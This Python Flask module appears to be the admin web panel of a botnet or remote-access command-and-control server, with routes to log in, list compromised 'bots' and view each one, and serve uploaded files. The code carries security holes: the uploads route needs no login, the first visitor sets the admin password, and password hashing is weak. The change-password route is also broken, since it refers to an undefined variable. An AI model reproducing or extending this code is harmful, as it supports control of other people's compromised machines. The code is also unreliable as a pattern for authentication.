import random
import string
from functools import wraps
import hashlib
from datetime import datetime

from flask import Blueprint
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask import session
from flask import url_for
from flask import flash
from flask import send_from_directory
from flask import current_app

from models import db
from models import Bot
from models import Command
from models import User


def hash_and_salt(password):
    password_hash = hashlib.sha256()
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
    password_hash.update(('%s%s' % (salt, password)).encode('utf-8'))
    return password_hash.hexdigest(), salt


def require_admin(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if 'username' in session and session['username'] == 'admin':
            return func(*args, **kwargs)
        else:
            return redirect(url_for('UI.login'))
    return wrapper


UI = Blueprint('UI', __name__, static_folder='static', static_url_path='/static/UI', template_folder='templates')


@UI.route('/')
@require_admin
def index():
    return render_template('index.html')


@UI.route('/login', methods=['GET', 'POST'])
def login():
    admin = User.query.filter_by(username='admin').first()
    if not admin:
        if request.method == 'POST':
            if 'password' in request.form:
                password_hash, salt = hash_and_salt(request.form['password'])
                new_user = User()
                new_user.username = 'admin'
                new_user.password = password_hash
                new_user.salt = salt
                db.session.add(new_user)
                db.session.commit()
                flash('Password set successfully. Please log in.')
                return redirect(url_for('UI.login'))
        return render_template('create_password.html')
    if request.method == 'POST':
        if request.form['password']:
                password_hash = hashlib.sha256()
                password_hash.update(('%s%s' % (admin.salt,  request.form['password'])).encode('utf-8') )
                if admin.password == password_hash.hexdigest():
                    session['username'] = 'admin'
                    last_login_time =  admin.last_login_time
                    last_login_ip = admin.last_login_ip
                    admin.last_login_time = datetime.now()
                    admin.last_login_ip = request.remote_addr
                    db.session.commit()
                    flash('Logged in successfully.')
                    if last_login_ip:
                        flash('Last login from ' + last_login_ip + ' on ' + last_login_time.strftime("%d/%m/%y %H:%M"))
                    return redirect(url_for('UI.index'))
                else:
                    flash('Wrong Password!')
    return render_template('login.html')


@UI.route('/change_password', methods=['GET', 'POST'])
@require_admin
def change_password():
    if request.method == 'POST':
        if 'password' in request.form:
            admin = User.query.filter_by(username='admin').first()
            password_hash, salt = hash_and_salt(request.form['password'])
            admin.password = password_hash
            admin.salt = salt
            db.session.add(admin_user)
            db.session.commit()
            flash('Password reset successfully. Please log in.')
            return redirect(url_for('UI.login'))
    return render_template('create_password.html')



@UI.route('/logout')
def logout():
    session.pop('username', None)
    flash('Logged out successfully.')
    return redirect(url_for('UI.login'))


@UI.route('/bots')
@require_admin
def bot_list():
    bots = Bot.query.order_by(Bot.last_online.desc())
    return render_template('bot_list.html', bots=bots)


@UI.route('/Bots/<botid>')
@require_admin
def bot_info(botid):
    bot = Bot.query.get(botid)
    if not bot:
        abort(404)
    return render_template('bot_page.html', bot=bot)


@UI.route('/uploads/<path:path>')
def uploads(path):
    return send_from_directory(current_app.config['UPLOAD_FOLDER'], path)
